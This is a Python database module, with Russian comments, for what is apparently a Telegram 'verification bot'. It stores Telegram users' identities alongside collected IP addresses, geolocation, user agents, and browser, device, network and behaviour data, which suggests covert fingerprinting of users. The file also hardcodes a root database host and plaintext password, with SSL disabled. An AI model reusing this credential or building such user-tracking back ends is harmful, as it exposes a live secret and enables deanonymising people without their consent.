"""
MySQL database module for Verification Bot
"""

import mysql.connector
from mysql.connector import Error
import logging
from typing import Optional, Dict, Any
import json
from datetime import datetime

logger = logging.getLogger(__name__)

class MySQLDatabase:
    def __init__(self):
        self.connection = None
        self.config = {
            'host': 'gondola.proxy.rlwy.net',
            'port': 15465,
            'database': 'railway',
            'user': 'root',
            'password': 'QWGJtSPaTMCjODrfySWkTyHyxHzYwEDM',
            'charset': 'utf8mb4',
            'use_unicode': True,
            'ssl_disabled': True  # Для Railway
        }
    
    def connect(self):
        """Установка соединения с MySQL"""
        try:
            self.connection = mysql.connector.connect(**self.config)
            logger.info("Подключено к MySQL базе данных на Railway")
            return True
        except Error as e:
            logger.error(f"Ошибка подключения к MySQL: {e}")
            return False
    
    def disconnect(self):
        """Закрытие соединения"""
        if self.connection and self.connection.is_connected():
            self.connection.close()
            logger.info("Соединение с MySQL закрыто")
    
    def init_tables(self):
        """Инициализация таблиц в MySQL"""
        try:
            cursor = self.connection.cursor()
            
            # Таблица пользователей
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    telegram_id BIGINT UNIQUE,
                    username VARCHAR(255),
                    first_name VARCHAR(255),
                    last_name VARCHAR(255),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                    INDEX idx_telegram_id (telegram_id)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ''')
            
            # Таблица токенов верификации
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS verification_tokens (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    user_id INT,
                    token VARCHAR(64) UNIQUE,
                    status ENUM('pending', 'completed', 'expired') DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    expires_at TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
                    INDEX idx_token (token),
                    INDEX idx_expires (expires_at)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ''')
            
            # Таблица собранных данных
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS collected_data (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    token VARCHAR(64),
                    ip_address VARCHAR(45),
                    user_agent TEXT,
                    country VARCHAR(100),
                    city VARCHAR(100),
                    browser_data JSON,
                    device_data JSON,
                    network_data JSON,
                    behavior_data JSON,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (token) REFERENCES verification_tokens(token) ON DELETE CASCADE,
                    INDEX idx_token (token),
                    INDEX idx_created (created_at)
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
            ''')
            
            self.connection.commit()
            logger.info("Таблицы MySQL созданы/проверены")
            return True
            
        except Error as e:
            logger.error(f"Ошибка создания таблиц: {e}")
            return False
    
    def save_verification_token(self, telegram_id: int, username: str, 
                               first_name: str, last_name: str, token: str) -> bool:
        """Сохранение токена верификации"""
        try:
            cursor = self.connection.cursor()
            
            # Добавить или обновить пользователя
            cursor.execute('''
                INSERT INTO users (telegram_id, username, first_name, last_name)
                VALUES (%s, %s, %s, %s)
                ON DUPLICATE KEY UPDATE
                username = VALUES(username),
                first_name = VALUES(first_name),
                last_name = VALUES(last_name)
            ''', (telegram_id, username, first_name, last_name))
            
            user_id = cursor.lastrowid
            if user_id == 0:  # Если запись обновлена
                cursor.execute('SELECT id FROM users WHERE telegram_id = %s', (telegram_id,))
                user_id = cursor.fetchone()[0]
            
            # Сохранить токен
            cursor.execute('''
                INSERT INTO verification_tokens (user_id, token, expires_at)
                VALUES (%s, %s, DATE_ADD(NOW(), INTERVAL 1 HOUR))
            ''', (user_id, token))
            
            self.connection.commit()
            logger.info(f"Токен сохранен для пользователя {telegram_id}")
            return True
            
        except Error as e:
            logger.error(f"Ошибка сохранения токена: {e}")
            return False
    
    def save_collected_data(self, token: str, collected_data: Dict[str, Any]) -> bool:
        """Сохранение собранных данных в MySQL"""
        try:
            cursor = self.connection.cursor()
            
            cursor.execute('''
                INSERT INTO collected_data 
                (token, ip_address, user_agent, country, city, 
                 browser_data, device_data, network_data, behavior_data)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
            ''', (
                token,
                collected_data.get('ip'),
                collected_data.get('user_agent'),
                collected_data.get('geo', {}).get('country'),
                collected_data.get('geo', {}).get('city'),
                json.dumps(collected_data.get('browser', {})),
                json.dumps(collected_data.get('device', {})),
                json.dumps(collected_data.get('network', {})),
                json.dumps(collected_data.get('behavior', {}))
            ))
            
            # Обновить статус токена
            cursor.execute('''
                UPDATE verification_tokens 
                SET status = 'completed'
                WHERE token = %s
            ''', (token,))
            
            self.connection.commit()
            logger.info(f"Данные сохранены для токена {token}")
            return True
            
        except Error as e:
            logger.error(f"Ошибка сохранения данных: {e}")
            return False

# Глобальный экземпляр
db = MySQLDatabase()

def init_database():
    """Инициализация базы данных"""
    if db.connect():
        db.init_tables()
        return True
    return False
